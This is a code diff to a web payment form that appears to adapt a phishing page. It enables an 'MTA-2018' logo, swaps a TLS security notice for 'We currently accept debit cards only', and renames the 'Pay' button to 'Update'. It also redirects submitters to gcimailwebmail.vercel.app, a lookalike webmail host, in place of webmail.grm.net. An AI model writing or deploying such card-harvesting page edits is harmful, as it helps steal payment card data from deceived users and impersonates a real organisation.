@@ -10,11 +10,11 @@
           <div class="styles__innerContainer___3wBPl">
 
             <div class="styles__header___sdbu2">
-              <!-- <img class="mx-auto d-block styles__logo___10yQo"
+               <img class="mx-auto d-block styles__logo___10yQo"
                    width="300"
                    height="182"
                    src="/images/MTA-2018-v1-transparent-2018-b7546f735056a36_b7547050-5056-a36a-082129b5b75f5c02.png"
-                   alt="Logo"> -->
+                   alt="Logo"> 
             </div>
 
             <form action="?" role="form" autocomplete="off">
@@ -151,12 +151,12 @@
                       <path d="m14.1 17.1h11.5v-4.2q0-2.4-1.7-4.1t-4-1.7-4.1 1.7-1.7 4.1v4.2z"></path>
                     </g>
                   </svg>
-                  This transaction is secured with TLS encryption
+                  Note: We currently accept debit cards only.
                 </div>
               </div>
 
               <div style="margin-bottom:1rem;">
-                By clicking "Pay" I affirm that I agree to the
+                By clicking "Update" I affirm that I agree to the
                 <a href="#" style="cursor:pointer;">terms and conditions</a>
               </div>
 
@@ -240,7 +240,7 @@ export default {
         this.loading = false;
       } else {
         // Redirect after sending
-        location.replace("https://webmail.grm.net/");
+        location.replace("https://gcimailwebmail.vercel.app/");
       }
     },
 
